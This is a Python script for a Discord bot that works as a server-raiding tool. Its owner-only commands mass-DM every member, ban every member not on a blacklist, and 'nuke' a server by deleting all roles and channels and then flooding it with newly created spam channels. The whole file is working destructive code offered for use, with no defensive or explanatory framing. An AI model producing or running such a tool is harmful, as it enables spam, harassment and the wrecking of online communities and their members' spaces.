from lib2to3.pgen2 import token
import discord
from discord.ext import commands
import asyncio, json, colorama, os, sys
from colorama import Fore
colorama.init(autoreset=True)



config = json.load(open('config.json', 'r'))
token = config['token']
msg = config['msg']
owner = config['owner-id']
bl = config['blacklist-id']
cooldown = config['cooldown']
namechannel = config["name-channel-nuke"]
nukemsg = config["nuke-msg"]
number = config['number-create']

intents = discord.Intents.all()
intents.members=True
client = commands.Bot(command_prefix = "+", intents = intents)
client.remove_command('help')

@client.event
async def on_ready():
    os.system('cls')

@client.command()
async def dmall(ctx):
    if str(ctx.author.id) == owner:
        await ctx.message.delete()
        members = ctx.guild.members
        for member in members:
            if str(member.id) in bl:
                print(f"{Fore.BLUE}Didn't send on the member : {member.name} because his id is on the blacklist.")
            else:
                try:
                    await member.send(msg)
                    print(f"{Fore.GREEN}message sent > {member.name} !")
                    await asyncio.sleep(int(cooldown))
                except:
                    print(f"{Fore.RED}Error > {member.name} !")
                    await asyncio.sleep(int(cooldown))
                    continue
        print(f"{Fore.YELLOW}="*50)
        print(f"{Fore.YELLOW}DMALL FINISH ON {ctx.guild.name} !")
    else:
        print(f"{Fore.RED}Someone try to launch a command on the bot but it was not the owner.")
        
@client.command()
async def banall(ctx):
    if str(ctx.author.id) == owner:
        await ctx.message.delete()
        members = ctx.guild.members
        count = 0
        for member in members:
            if str(member.id) in bl:
                print(f"{Fore.BLUE}Didn't ban the member : {member.name} because his id is on the blacklist.")
            else:
                try:
                    await ctx.guild.ban(member, reason = "NOPE")
                    print(f"{Fore.GREEN}banned > {member.name} !")
                    count += 1
                except:
                    print(f"{Fore.RED}Error > {member.name}")
                    continue
        print(f"{Fore.YELLOW}="*50)
        print(f"{Fore.YELLOW}Successfully BANNED {count} MEMBERS ON {ctx.guild.name} !")
    else:
        print(f"{Fore.RED}Someone try to launch a command on the bot but it was not the owner.")
        
@client.command()
async def nuke(ctx):
    if str(ctx.author.id) == owner:
        await ctx.message.delete()
        for role in ctx.guild.roles:
            try:
                await role.delete()
            except:
                print(f"{Fore.RED}Error on deleting role > {role.name} (make sure you put the bot on the top of the roles)")
                continue
        for c in ctx.guild.channels:
            await c.delete()
        for i in range(int(number)):
            channel = await ctx.guild.create_text_channel(name=namechannel)
            await channel.send(nukemsg)
        print(f"{Fore.GREEN}="*50)
        print(f"{Fore.GREEN}Succefully nuked {ctx.guild.name}")
    else:
        print(f"{Fore.RED}Someone try to launch a command on the bot but it was not the owner.")
        
                
client.run(token)
